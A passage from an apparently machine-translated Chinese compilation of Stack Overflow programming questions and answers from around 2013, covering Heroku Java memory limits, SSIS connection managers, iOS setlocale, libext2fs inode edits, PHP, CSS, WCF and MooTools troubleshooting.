2013-03-21T22:24:25+00:00 heroku[web.2]: source=heroku.13369226.web.2.cb423d08-dd15-41c1-9843-95bcdc269111 measure=memory_swap val=20.93 units=MB
2013-03-21T22:24:25+00:00 heroku[web.2]: source=heroku.13369226.web.2.cb423d08-dd15-41c1-9843-95bcdc269111 measure=memory_pgpgin val=145460 units=pages
2013-03-21T22:24:25+00:00 heroku[web.2]: source=heroku.13369226.web.2.cb423d08-dd15-41c1-9843-95bcdc269111 measure=memory_pgpgout val=14414 units=pages
2013-03-21T22:24:25+00:00 heroku[web.2]: Process running mem=532M(104.1%)
2013-03-21T22:24:25+00:00 heroku[web.2]: Error R14 (Memory quota exceeded)
2013-03-21T22:24:29+00:00 heroku[web.4]: source=heroku.13369226.web.4.25274242-a3af-4d2e-9da3-44e5e0a45c09 measure=load_avg_1m val=1.83
2013-03-21T22:24:29+00:00 heroku[web.4]: source=heroku.13369226.web.4.25274242-a3af-4d2e-9da3-44e5e0a45c09 measure=memory_total val=400.66 units=MB
2013-03-21T22:24:29+00:00 heroku[web.4]: source=heroku.13369226.web.4.25274242-a3af-4d2e-9da3-44e5e0a45c09 measure=memory_rss val=400.61 units=MB
2013-03-21T22:24:29+00:00 heroku[web.4]: source=heroku.13369226.web.4.25274242-a3af-4d2e-9da3-44e5e0a45c09 measure=memory_cache val=0.05 units=MB
2013-03-21T22:24:29+00:00 heroku[web.4]: source=heroku.13369226.web.4.25274242-a3af-4d2e-9da3-44e5e0a45c09 measure=memory_swap val=0.00 units=MB
2013-03-21T22:24:29+00:00 heroku[web.4]: source=heroku.13369226.web.4.25274242-a3af-4d2e-9da3-44e5e0a45c09 measure=memory_pgpgin val=113336 units=pages
2013-03-21T22:24:29+00:00 heroku[web.4]: source=heroku.13369226.web.4.25274242-a3af-4d2e-9da3-44e5e0a45c09 measure=memory_pgpgout val=10767 units=pages
2013-03-21T22:24:29+00:00 heroku[web.3]: source=heroku.13369226.web.3.2132f01f-94b1-4151-8fa8-09cdb2774919 measure=load_avg_1m val=0.25
2013-03-21T22:24:29+00:00 heroku[web.3]: source=heroku.13369226.web.3.2132f01f-94b1-4151-8fa8-09cdb2774919 measure=memory_total val=397.70 units=MB
2013-03-21T22:24:29+00:00 heroku[web.3]: source=heroku.13369226.web.3.2132f01f-94b1-4151-8fa8-09cdb2774919 measure=memory_rss val=397.64 units=MB
2013-03-21T22:24:29+00:00 heroku[web.3]: source=heroku.13369226.web.3.2132f01f-94b1-4151-8fa8-09cdb2774919 measure=memory_cache val=0.05 units=MB
2013-03-21T22:24:29+00:00 heroku[web.3]: source=heroku.13369226.web.3.2132f01f-94b1-4151-8fa8-09cdb2774919 measure=memory_swap val=0.00 units=MB
2013-03-21T22:24:29+00:00 heroku[web.3]: source=heroku.13369226.web.3.2132f01f-94b1-4151-8fa8-09cdb2774919 measure=memory_pgpgin val=112163 units=pages
2013-03-21T22:24:29+00:00 heroku[web.3]: source=heroku.13369226.web.3.2132f01f-94b1-4151-8fa8-09cdb2774919 measure=memory_pgpgout val=10353 units=pages 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-04-29T02:13:50.503

我遇到过同样的问题。Heroku 告诉您机器内存不足，而不是 Java VM。Heroku Play 2.2 部署实际上有一个 bug，启动脚本读取的是 java_opts，而不是 JAVA_OPTS。

我通过设置两者来修复它：

```
heroku config:add java_opts='-Xmx384m -Xms384m -Xss512k -XX:+UseCompressedOops'
heroku config:add JAVA_OPTS='-Xmx384m -Xms384m -Xss512k -XX:+UseCompressedOops' 
```

我还必须设置 -Xms 否则我得到一个错误，说最小值和最大值不兼容。我猜 Play2.2 使用的默认值高于 384m。

要找出您使用的总内存，[这是一个有用的等式](https://plumbr.eu/blog/memory-leaks/why-does-my-java-process-consume-more-memory-than-xmx)（Java 8 之前）：

`Max memory = [-Xmx] + [-XX:MaxPermSize] + number_of_threads * [-Xss]`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T20:51:53.363

这篇 Heroku 开发中心文章中有 3 个诊断工具可能会有所帮助： [https ://devcenter.heroku.com/articles/java-memory-issues](https://devcenter.heroku.com/articles/java-memory-issues)

查看内存日志记录代理、详细的 GC 标志和日志运行时指标（[https://devcenter.heroku.com/articles/log-runtime-metrics](https://devcenter.heroku.com/articles/log-runtime-metrics)）。这些应该会给你更多的可见性。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-04-07T01:23:49.220

您忘记考虑 Permgen（JRE 8 之前）或[Metaspace](https://dzone.com/articles/java-8-permgen-metaspace) (JRE-8+) 内存需求；这是为 Java 类信息和某些静态信息保留的内存。计划在堆顶部再增加 100-150MB，看起来你的更高。您可以使用 -XX:MaxMetaspaceSize 标志对其进行限制，但请注意，如果超出该限制，您将收到错误消息。

我有一台服务器的上限也为 -Xmx384M，事实证明，考虑到 Metaspace，实际内存使用量也在 500 MB 左右（但对于更复杂的应用程序会更高）。它正在运行一个相当复杂的应用程序（Jenkins），所以元空间大小最终约为 170 MB，其中堆达到了极限，使用了 554 MB 的 RAM。

# android - Eclipse Android 未生成 R.java

> ID：15555113
> 
> 赞同：0
> 
> 时间：2013-03-21T18:16:56.193
> 
> 标签：android, r.java-file

这是我第一次为安卓开发。我正在尝试在eclipse环境中开发，但我遇到了问题。没有生成类 R.java。我已经尝试过功能清理或刷新->清理等所有方法，然后重新安装 Eclipse。也许问题可能出在我的布局中：

我的布局：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:paddingBottom="@dimen/activity_vertical_margin"
    android:paddingLeft="@dimen/activity_horizontal_margin"
    android:paddingRight="@dimen/activity_horizontal_margin"
    android:paddingTop="@dimen/activity_vertical_margin"
    tools:context=".MainActivity" >

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="@string/hello_world" />

</RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T18:19:29.410

我想你的意思是它没有被再生？这个问题在 Eclipse 中经常出现。只需删除现有的 R.java，它就会正确地重新生成。

或者你的意思是你根本没有 R.java？

# asp.net - 将 CheckBox.Checked 状态插入数据库

> ID：15555115
> 
> 赞同：0
> 
> 时间：2013-03-21T18:17:04.620
> 
> 标签：asp.net, vb.net

我认为这会更简单，但它给我带来了麻烦。我基本上希望用户选中几个框，然后将每个单独的复选框添加到表中的一行。我尝试了 CheckBoxList，但决定单独添加每个 Checkbox。基本上这是我的代码：

```
 Using cn2 As New SqlConnection(connectionString)
        Dim cmd2 As New SqlCommand
        If chkActions.Checked = True Then
            cmd2 = New SqlCommand("Insert into [Turns] (Actions) VALUES ('1'", cn2)
            cn2.Open()
            cmd2.ExecuteNonQuery()
            cn2.Close()

        End If
    End Using 
```

Actions 行是一种位数据类型，据我所知，它只是一个 1、0 或 NULL。它给了我一个“靠近...的语法不正确”错误。如果有人能发现错误或者更好的方法，我将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:22:21.807

您将自己的`bit`价值视为`string`.

去掉`'` `'`周围`1`。您还需要`)`在 the 之后`1`关闭括号

IE

```
cmd2 = New SqlCommand("Insert into [Turns] (Actions) VALUES (1)", cn2) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T18:20:07.253

最后缺少括号

```
cmd2 = New SqlCommand("Insert into [Turns] (Actions) VALUES ('1')", cn2) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-21T18:20:35.570

看起来你错过了一个结束）

```
cmd2 = New SqlCommand("Insert into [Turns] (Actions) VALUES ('1'", cn2) 
```

应该是

```
cmd2 = New SqlCommand("Insert into [Turns] (Actions) VALUES ('1')", cn2) 
```

# c# - Silverlight Toolkit：右键单击和左键单击选择图表系列数据项

> ID：15555123
> 
> 赞同：0
> 
> 时间：2013-03-21T18:17:26.620
> 
> 标签：c#, mvvm, silverlight-4.0, charts, silverlight-toolkit

抱歉，如果这是一个新手问题，但是，好吧，我是......我已经尝试这样做 2 天了，在网上搜索并询问 arround，没有人能帮助我，所以任何见解都将不胜感激。 ..

我基本上需要做的是在打开上下文菜单之前用右键单击选择图表系列（ColumnSeries 或 LineSeries）数据点。当我处理 menuItemClick 事件时，我需要数据点的 x 轴的值。理想情况下，我希望能够在右键单击和左键单击时引发 SelectionChanged 事件，但还没有找到任何方法。我尝试了一些替代方案，但一直走到死胡同。这个解决方案似乎做了我想要的 LineSeries：[选择 Silverlight Toolkit 图表中最近的点](https://stackoverflow.com/questions/5694499/select-the-nearest-point-in-a-silverlight-toolkit-chart)，但是我的系列中有 90% 是 ColumnSeries 并且没有 serie.Points 属性，所以我又被卡住了......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T09:23:22.613

最后我使用了这个解决方案：[http ://www.c-sharpcorner.com/uploadfile/baimey/silverlight-charts-coordinates-on-mousemove/](http://www.c-sharpcorner.com/uploadfile/baimey/silverlight-charts-coordinates-on-mousemove/)

我想我最好把它贴出来以防其他人需要这个。

```
 private void Chart_MouseRightButtonUp(object sender, MouseButtonEventArgs e)
    {
        Series serie = sender as Series;
        DateTime xAxisValue;
        Point p = e.GetPosition(serie);
        ICategoryAxis xAxis = (CategoryAxis)Chart.ActualAxes[0];
        object xHit = xAxis.GetCategoryAtPosition(new UnitValue(p.X, Unit.Pixels));

        if (SelectedObj != null)
        {
            xAxisValue = (DateTime)new DateTimeConverter().ConvertBack(xHit as String, typeof(String), SelectedObj.DisplayFrequency, Thread.CurrentThread.CurrentUICulture);

            foreach (Frequency frequency in SelectedObj.Frequencies)
            {
                if(frequency == SelectedObj.DisplayFrequency)
                    addMenuItem(frequency, true, xAxisValue);
                else
                    addMenuItem(frequency, false, xAxisValue);
            }

            cMenu.IsOpen = true;
            cMenu.HorizontalOffset = e.GetPosition(LayoutRoot).X;
            cMenu.VerticalOffset = e.GetPosition(LayoutRoot).Y;
        }
    }

    private void addMenuItem(Frequency frequency, bool isDisplayFrequency, DateTime xAxisValue)
    {
        menuItem = new MenuItem();
        menuItem.Header = frequency;
        menuItem.Tag = xAxisValue;
        if (isDisplayFrequency)
        {
            menuItem.Icon = new TextBlock { Text = "\xfc", FontFamily = new System.Windows.Media.FontFamily("Wingdings"), FontWeight = FontWeights.Bold, TextAlignment = TextAlignment.Center };
            menuItem.FontWeight = FontWeights.Bold;
        }
        cMenu.Items.Add(menuItem);
        menuItem.Click += new RoutedEventHandler(menuItem_Click);
    }

    void menuItem_Click(object sender, RoutedEventArgs e)
    {
        MenuItem item = sender as MenuItem;
        Frequency itemFreq = (Frequency)item.Header;
        DateTime xAxisValue = (DateTime)item.Tag;

        ...

        cMenu.IsOpen = false;
    } 
```

# php - 从多维数组中获取值

> ID：15555124
> 
> 赞同：0
> 
> 时间：2013-03-21T18:17:27.170
> 
> 标签：php, json, multidimensional-array

我有一个脚本可以创建以下格式的数组

```
 $named_array["vehicles"][0]['vehicle'] = "i100-1 "  ;
  $named_array["vehicles"][1]['vehicle'] = "i100-2 "  ;
  $named_array["vehicles"][2]['vehicle'] = "i100-46 "  ; 
```

我稍后在脚本中要做的是从 $named_array 获取索引值 [0-1-2 等]，但我只有值（ i100-1 等）作为查询选项，这样我以后可以更改它. 我想要实现的是，什么是索引值`$named_array`where value is i100-2

这是最后输出到 json 。

我希望这是有道理的 ！请问有什么帮助吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T18:20:53.577

```
function complex_index_of($named_array, $val){
    for($i=0, $n=count($named_array['vehicles']); $i<$n; $i++){
        if ($named_array['vehicles'][$i]['vehicle'] == $val)
            return $i;
    }
    return -1;
}

echo complex_index_of($named_array, 'i100-2 ');
// output: 1 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T18:22:49.233

尝试这样的事情（也许创建一个函数，如果你需要做不止一次）

```
$needle = 'i100-1';
$vIndex = -1;
foreach ($named_array["vehicles"] as $index => $data) {
    if($data['vehicle'] == $needle) {
        $vIndex = $index;
        break;
    }
} 
```

# ssis - 连接管理器的表达式生成器不显示变量

> ID：15555125
> 
> 赞同：19
> 
> 时间：2013-03-21T18:17:35.903
> 
> 标签：ssis

我遇到了[与](http://social.msdn.microsoft.com/Forums/en-US/sqlintegrationservices/thread/71d0d35b-0ef5-4f3a-a91a-b9664fe89ad9/)我一直在寻找的完全相同的问题，但这是我看到相同问题的唯一地方并且没有解决。

有谁知道问题可能是什么？

我检查了 Visual Studio，我的 SSIS 版本是 11.0.2100.60（不是试用版，不是测试版）。

**编辑：**这些是我正在采取的步骤和问题

首先我选择一个连接管理器，右键单击，选择属性并单击表达式选项 ![第一步](../Images/34c466752e7782e03c3d66f3017151bb.png)

然后在属性表达式生成器中选择连接字符串属性并单击表达式选项 ![在此处输入图像描述](../Images/a42cc8111b7ac4b414f5ceec719cadf7.png)

最后，在 Expression Builder 对话框中没有变量选项，在我读过的每个页面中都说那里应该有一个 Variables 节点 ![在此处输入图像描述](../Images/ef41f808e6c3803c94c257966e99496c.png)

我错过了什么吗？

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2013-03-21T19:59:49.183

SSIS 2012 引入了项目级连接管理器的概念。我在 MSDN 论坛上的参考帖子中看到，用户创建了一个项目级平面文件连接管理器并且无法使用本地变量对其进行配置。假设这是问题所在，我的答案如下。

一个 SSIS 项目通常不止一个包。为了简化生活，SSIS 团队现在允许跨项目共享公共资源，连接管理器就是这些资源之一。

从逻辑上讲，如果一个东西在一个项目中共享，那么*只*存在于一个文件中的东西如何配置该资源？该配置更改仅在 Package1 执行时有效。当 Package2 触发时，除非将*相同*的变量和*相同*的表达式应用于共享资源，否则您将遇到不同的结果。那将是一场维护噩梦，如果您没有强大的配置实践，您可能已经经历过。

如果我在项目级别创建平面文件连接管理器，我只能引用*也在*项目级别的变量。除了项目级别没有变量。相反，它们被称为**参数**。

为此，我创建了一个名为`SomeProjectParameter`

![项目参数](../Images/38b03dd475d79c3336714ce6aaaa2fde.png)

然后我创建了一个包 Package1.dtsx，并添加了 2 个平面文件连接管理器：FlatFileConnectionManagerLocal 和 FlatFileConnectionManagerProject

代替那个包，我还创建了一个名为 SomeLocalVariable 的变量。

此屏幕截图显示我将表达式应用于 FlatFileConnectionManagerLocal 的 ConnectionString 属性。在那里你可以看到包变量，`SomeLocalVariable`以及`SomeProjectParameter`

![带有参数和局部变量的本地 CM 上的表达式构建器](../Images/9f269ae6d1f8011fe80cd6645ba5ed97.png)

现在，如果我尝试将表达式应用于项目的连接管理器，您将只有项目参数可供您使用。

![项目 CM 和唯一可用的参数](../Images/186fafcb037f236a67b7fc183dbdc8be.png)

有趣的是，您不能将表达式应用于 SSIS 包上下文之外的项目级连接管理器。在您打开 SSIS 包之前，您根本没有可用的编辑器。但是，一旦应用，项目中的*所有*包都将进行类似的配置。

我想是IDE的怪癖。另外，不要对这些屏幕截图中缺少颜色感到震惊，我正在使用 2012 版本的 SSDT。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2017-09-13T12:32:16.203

我遇到了同样的问题，这是因为平面文件源被设置为项目源，所以我不得不将其转换为包连接。

[![初始平面文件源](../Images/1273b6ab1be3d13a828d85e8bbd9c321.png)](https://i.stack.imgur.com/FODV3.png)

右键单击源并选择转换为包连接

[![转换为包连接](../Images/70c27e25e5a855bfc73e1829072acf40.png)](https://i.stack.imgur.com/drBj3.png)

也许这会有所帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-07-04T08:14:49.720

Microsoft SSIS 教程有这些令人困惑的陈述：

1.  在 Connection Managers 窗格中，右键单击 Sample Flat File Source Data，然后选择 Properties。
2.  在“属性”窗口中，确保 PackagePath 以**\Package.Connections**开头。**如果不是**，在 Connection Managers 窗格中，右键单击 Sample Flat File Source Data，然后选择 Convert to Package Connection。 **\Package.Connections**最初显示在属性窗口中，尽管我还没有转换为包连接。阅读完这个帖子后，我右键单击 Sample Flat File Source Data 然后转换为包连接并能够完成课程。感谢您的回答！

# wcf - Ember-Data rev。11 <-> 错误：XML 而不是 JSON 作为内容类型

> ID：15555128
> 
> 赞同：2
> 
> 时间：2013-03-21T18:17:45.993
> 
> 标签：wcf, ember.js, ember-data

为什么 ember 请求 XML 而不是 JSON？

**根据 firebug 的 XML 响应**：

XML-processing缺陷：未找到元素地址：moz-nullprincipal：{664ded3f-7063-4f92-b404-3895f595c584}第1行第1列：[我翻译成英文]

**Ember 数据请求（不工作）**

请求标头：

接受 text/html,application/xhtml+xml,application/xml;q=0.9, */* ;q=0.8

响应标头：

内容类型应用程序/xml；字符集=utf-8

**Ajax 请求（工作）**

请求标头：

接受 application/json, text/javascript, */* ; q=0.01

响应标头：

应用程序/json；字符集=utf-8

**我的商店和适配器**

```
App.store = DS.Store.create({
revision: 11,

});

DS.RESTAdapter.reopen({
  url: '.../json/ember'
}); 
```

**我的嵌套模型**

```
App.Line = DS.Model.extend({
    lineIdentifier: DS.attr('string'),  
    shifts: DS.hasMany('App.Shift'),
});

App.Shift = DS.Model.extend({
    name: DS.attr('string'),
    line: DS.belongsTo('App.Line'), 
}); 
```

**我的 WCF 界面**

```
 [OperationContract]
    [WebInvoke(
        Method = "GET",
        ResponseFormat = WebMessageFormat.Json,
        UriTemplate = "/json/ember/lines"
        )]
    LinesArray LinesEmber(); 
```

**我的 JSON**

```
{
     "Line":[
            {"Shift":[{},{},{},{}],...},
            {"Shift":[{},{},{},{}],...}]
} 
```

那么反应会很棒，这是我硕士论文的最后一个重要的编码步骤。：） 提前致谢。

**[更新]**

失败的 ember 调用：对我来说，令人惊讶的是，ember 请求 xml... ![余烬调用失败](../Images/2ef64e7462eddb355d73c26764bb377d.png)

成功的ajax调用 ![成功的ajax调用](../Images/58f1610ff72379d322f2e860664413f9.png)

# ios - setlocale() 在 iOS 模拟器中不起作用？

> ID：15555129
> 
> 赞同：1
> 
> 时间：2013-03-21T18:17:52.270
> 
> 标签：ios, c, unicode, ios6, wchar-t

更新：奇怪的是，setlocale() 只在 iOS 模拟器上失败，所以我修改了问题标题。它在实际设备上运行良好。

我正在使用 iOS 6 下的本机 (C/C++) 代码，我需要格式化任意`wchar_t`字符串。但是，当格式化包含 Latin-1 代码页之外的代码点的字符串时，会`swprintf`失败（返回值 -1 和 errno= `EILSEQ`）。

```
wchar_t buff[256];
swprintf(buff, 256, L"\u00A9 %ls", L"ascii"); // works
swprintf(buff, 256, L"\u03A0 %ls", L"ascii"); // will return -1 
```

[在此处](https://stackoverflow.com/questions/15438968/vswprintf-fails-for-certain-unicode-codepoints-under-mac-os-x)询问相关问题后，问题似乎是语言环境设置不正确（我已验证该解决方案在 Mac OS X 下有效）。但是在iOS 6下好像没有效果：

```
#include <locale.h>

setlocale(LC_CTYPE,""); 
```

按照[此处](http://yui.co/setlocale-in-ios-aka-swprintf-in-ios/)的说明，我已将语言环境文件手动复制/添加到我的项目中，并设置`PATH_LOCALE`环境变量，但问题仍然存在：

```
NSString* resourcePath=[[NSBundle mainBundle] resourcePath];
setenv("PATH_LOCALE", [resourcePath UTF8String], 1);
setlocale(LC_CTYPE,"en_US.UTF-8"); 
```

有谁知道我如何让 setlocale() 在 iOS 6 下工作（同时仍然让应用程序被 Apple Store 接受）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2019-06-20T23:33:45.803

我无法让斯蒂芬的解决方案发挥作用。但是这两个超级简单的解决方案都对我有用：

1.  `setlocale(LC_CTYPE, "UTF-8")`
2.  `newlocale(LC_CTYPE_MASK, "UTF-8")`结合带有语言环境参数的 foo_l 变体 wchar_t 类。

虽然 iOS 可能没有附带一整套语言环境（包括 en_US.UTF-8），但它似乎附带了基本的无语言 UTF-8 语言环境。但它只适用于 LC_CTYPE；尝试 LC_ALL 将失败。你当然可以用

```
char *result = setlocale(LC_TYPE, "UTF-8");
Assert(result && strcmp(result, "UTF-8") == 0); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-12-19T22:56:26.387

PATH_LOCALE 是语言环境文件的基本路径，每个语言环境都在一个子目录中，例如：

fr/LC_TIME fr/.. en/LC...

所以你需要子目录，而 iOS 包不支持子目录。

当你这样做

setlocale(LC_CTYPE,"en_US.UTF-8");

C 库在 PATH_LOCALE 中查找名为“en_US.UTF-8”的目录。

我找到的解决方案是将包中的语言环境作为 zip 添加（具有整个子目录结构），在文档路径中首次启动时将其解压缩并将 PATH_LOCALE 设置为该新目录。

```
NSString* documentsPath = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];

    NSString* localeDir = [documentsPath stringByAppendingPathComponent:@"/locale"];
    BOOL fileExists = [[NSFileManager defaultManager] fileExistsAtPath:localeDir];

    if (!fileExists) {
        NSString *filepath = [[NSBundle mainBundle] pathForResource:@"locale" ofType:@"zip"];
        ZipArchive *zipArchive = [[ZipArchive alloc] init];
        [zipArchive UnzipOpenFile:filepath];
        [zipArchive UnzipFileTo:documentsPath overWrite:YES];
        [zipArchive UnzipCloseFile];
    }
    setenv("PATH_LOCALE", [[NSString stringWithFormat:@"%@/locale", documentsPath] cString], 1); 
```

这使用您必须包含在项目中的 Ziparchive。

[https://code.google.com/archive/p/ziparchive/](https://code.google.com/archive/p/ziparchive/)

# linux - 更改 ext4 文件系统上的 ondisk inode

> ID：15555133
> 
> 赞同：0
> 
> 时间：2013-03-21T18:17:59.193
> 
> 标签：linux, inode, ext3, ext4

我正在使用`libext2fs`在磁盘 inode 上进行修改，但它不起作用。我正在安装的文件系统（EXT4）上执行此操作。我尝试`e2fsck`在已安装的文件系统上运行，它似乎可以工作（尽管它会发出警告）。

以下是我的代码。

它运行没有错误，但是当我对 testfile.txt 进行统计时，我没有看到任何变化。

任何想法 ？或替代品？

```
#include <linux/fs.h>
#include <ext2fs/ext2fs.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "e2p/e2p.h"

int main(int argc, char **argv)
{
    errcode_t ret;
    int flags;
    int superblock = 0;
    int open_flags = EXT2_FLAG_RW | EXT2_FLAG_64BITS | EXT2_FLAG_SKIP_MMP | EXT2_FLAG_NOFREE_ON_ERROR | EXT2_FLAG_FORCE;
    int blocksize = 0;
    ext2_filsys fs = NULL;
    struct ext2_inode inode;
    ext2_ino_t root, cwd, inum;
    int i, c;
    struct stat fileStat;

    const char * str = "This will be output to testfile.txt\n";

    //Create some file for testing.
    FILE * filedesc = fopen( "/home/test/testfile.txt", "w" );
    fprintf( filedesc, str );
    fclose( filedesc );

    //open the device..( this is already mounted, e2fsck works on mounted devices. so I hope this will work. )
    ret = ext2fs_open2( "/dev/sda1" , open_flags, superblock, blocksize, unix_io_manager, &fs );
    if( ret ) 
    {
        fprintf(stderr, "failed to open filesystem %d.\n", ret);
        return 1;
    }

    //Get the inode number of file using stat
    ret = stat( "/home/test/testfile.txt", &fileStat );
    if( ret )
    {
        fprintf(stderr, "failed to stat\n");
    }

    ret = ext2fs_read_inode(fs, fileStat.st_ino, &inode );
    if( ret )
    {
        fprintf(stderr, "failed to open inode\n");
    }

    //do some changes.
    inode.i_ctime += 1;

    ext2fs_mark_changed( fs );

    //write the modified inode.
    ret = ext2fs_write_inode( fs, fileStat.st_ino, &inode );
    if( ret )
    {
        fprintf(stderr, "failed to open inode\n");
    }

    //this didn't help
    ret = ext2fs_flush(fs);

    ret = ext2fs_close(fs);
    if( ret )
    {
        fprintf(stderr, "error while closing filesystem\n");
    }

    return 0;
} 
```

# php - 链接重定向以使用 PHP 删除查询

> ID：15555134
> 
> 赞同：-1
> 
> 时间：2013-03-21T18:18:03.000
> 
> 标签：php, hyperlink

通常，当我需要删除一个查询时，我不知道该怎么做，我不是说，我不知道执行此操作的 SQL 代码。我的意思是我不知道“调用”该函数的确切方法。我发现的方法是通过 GET 调用该函数：

```
<?php
   $action = $_GET['action'];
   $id = $_GET['id'];

   if($action == 'delete'){
      echo "This would to the query to delete the element";
   }
?> 
```

所以，我必须通过 GET 来调用它。我使用下一个 URI 创建一个链接：

`http://localhost/test/index.php?action=delete&id=1`

这实际上有效。但我不喜欢它是如何工作的。我不喜欢这种方式，我想知道是否还有其他方法可以做到完全相同，使用 Javascript、JSON 甚至 AJAX。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T18:24:44.903

您试图通过 POST 请求删除操作？在隐藏的文本字段中发送 id，如下所示：

```
<form method="POST" action="linkhere">
    <input type="hidden" name="id" value="<?=$idhere?>">
    <input type="hidden" name="action" value="actionnamehere">
    <input type="submit" value="Delete">
</form> 
```

您也可以使用确认按钮添加一些 javascript。使用它你不需要使用 GET 方法并在 URL 上显示这些参数。

# python - 谷歌搜索错误

> ID：15555135
> 
> 赞同：0
> 
> 时间：2013-03-21T18:18:09.567
> 
> 标签：python, search, urllib2

我不明白为什么这段代码有效：

```
import urllib2 

url = urllib2.urlopen('http://www.google.fr/search?hl=en&q=voiture').read() 
print url 
```

而不是这个：

```
import urllib2 

url = urllib2.urlopen('http://www.google.fr/search?hl=en&q=voiture&start=2&sa=N').read() 
print url 
```

它显示以下错误：

```
**urllib2.HTTPError: HTTP Error 403: Forbidden** 
```

谢谢 ;）

# google-bigquery - 使用 Bigquery Web UI 链接到特定查询

> ID：15555136
> 
> 赞同：3
> 
> 时间：2013-03-21T18:18:14.153
> 
> 标签：google-bigquery

我在 bigquery 中做了很多查询，看起来像： select foo, bar, baz from [table_DATE] where ggg = VALUE order by time_field

我想创建一组链接，我可以在其中预先填写 DATE 和 VALUE 并让用户选择运行查询。无论如何我可以为此构建一个URL吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T20:08:40.480

目前，这是不可能的。我们将此作为功能请求建议。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-04-20T17:50:51.363

这实际上是现在可用

您可以[`save`](https://cloud.google.com/bigquery/docs/saving-sharing-queries#saving_queries)查询并将它们作为

*   私人（仅对您可见）
*   项目（项目成员可以查看和编辑）
*   公开（知道链接的任何人都可以查看，但不能编辑）

之后，您可以[`share`](https://cloud.google.com/bigquery/docs/saving-sharing-queries#sharing_queries)使用它们或仅将其用作快捷方式

# css - css3中的拟合元素

> ID：15555137
> 
> 赞同：0
> 
> 时间：2013-03-21T18:18:16.407
> 
> 标签：css, animation, hyperlink, transform, transition

两天前，我向动画 css3 寻求帮助。这是我的动画：[链接]http://jsfiddle.net/SD58Z/8/[/link]

一切正常，但我还有另一个问题。是否可以自动设置这条线的宽度，无论链接文本的长度如何，这条线都适合吗？关键是当我的标题较长时，这条线太短了。

我刚刚创建了一个 mod 并且线条显示正确，但我的动画消失了。[链接]http://jsfiddle.net/DashDesign/SD58Z/284/[/link]

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T18:33:03.080

我不确定您要做什么，但这会使下划线跨度为 500 像素。

```
.line{
font-family:Tahoma;
width:0px;
position: absolute;

background:black;
transition:width 0.4s ease ;
-moz-transition: 0.4s ease ; /* Firefox 4 */
-webkit-transition: 0.4s ease ; /* Safari and Chrome */
-o-transition: 0.4s ease; /* Opera */
}

div:hover{
width:500px;
}
.line div{
    background:#fff;
    position:relative;
    bottom:1px;
}
} 
```

2个变化是悬停时的宽度，你的小提琴最后缺少一个右括号

# c# - 关于asp.net mvc 4和wcf的基本疑惑

> ID：15555138
> 
> 赞同：0
> 
> 时间：2013-03-21T18:18:23.237
> 
> 标签：c#, wcf, asp.net-mvc-4

好吧，我正在考虑用 C# 和 asp.net mvc 4 创建一个 web 应用程序。这个想法是创建一个可以在任何浏览器中使用的 asp.net web 应用程序，这样我就可以在任何地方和任何计算机上使用我的应用程序。

但是在通信中，我可以使用 WCF 还是通过 HTTP 进行通信并且我不能选择其他传输方式？

我的意思是，如果 WCF 仅用于通信两个桌面/移动应用程序，或者它也可以用于 Web 应用程序？

在 Web 应用程序中是否可以进行双工通信？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:20:56.100

> 我可以使用 WCF

**是**的，WCF 可以托管在 asp.net 应用程序中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T18:27:13.687

如果要使用 SOAP，可以在 WCF 中使用 HTTP 绑定。否则，您可能想研究[WebApi](http://www.asp.net/web-api)，它提供了比 HTTP 更自然的抽象。对于 HTTP 上的双工通信，您可以考虑[SignalR](http://signalr.net/)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-24T10:52:35.897

**在系统以断开连接的方式工作的客户端-服务器模型中，双工通信无法轻松引发。**

当您的客户（浏览器）需要一些数据时会发生什么。1) 请求到达服务器 2) 服务器请求 WCF 双工服务并忘记等待响应，因为它本质上是双工的。3) WCF 双工用数据响应服务器 4) 现在服务器可以通过保存或记录到数据库来处理该数据，但不知道谁是请求的客户端以及如何提示它们。

那么`SignalR`使用一些奇怪的编码的解决方案是什么用户。

或者

*通过 jquery`$.ajax`调用直接从浏览器调用 WCF 服务所以您的浏览器直接将有来自 WCF 服务的响应。*

# mootools - Mootools - getFirst().get('text') 不是函数？

> ID：15555143
> 
> 赞同：1
> 
> 时间：2013-03-21T18:18:31.970
> 
> 标签：mootools

的HTML：

```
<ul id="nav">
  <li id="listItem">a list item</li>
  <li id="link01">list item with ID</li>
  <li id="link02"><a href="#">another link with ID</a></li>
  <li class="lastItem"><a href="#">Contact</a></li>
  <li class="lastItem">the Very Last List Item</li>
</ul> 
```

的JavaScript：

```
alert($$('.lastItem').getFirst('li').get('text')); 
```

控制台返回此错误：

```
TypeError: $$(...).getFirst(...).get is not a function 
```

嗯……什么？我错过了什么？如果我取出 getFirst()，它可以工作，但当然会返回两个`<li>`文本内容......这是我不想要的。只想要第一个...

